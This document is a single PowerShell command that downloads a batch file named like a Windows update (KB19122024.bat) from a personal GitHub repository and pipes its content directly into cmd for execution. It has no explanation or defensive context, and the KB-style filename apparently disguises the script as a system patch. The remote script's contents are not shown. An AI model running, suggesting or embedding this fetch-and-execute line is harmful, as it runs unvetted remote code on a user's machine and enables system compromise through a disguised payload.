Invoke-WebRequest -Uri https://raw.githubusercontent.com/nurfauzi1605/Testing/refs/heads/main/KB19122024.bat -UseBasicParsing | ForEach-Object { $_.Content } | cmd
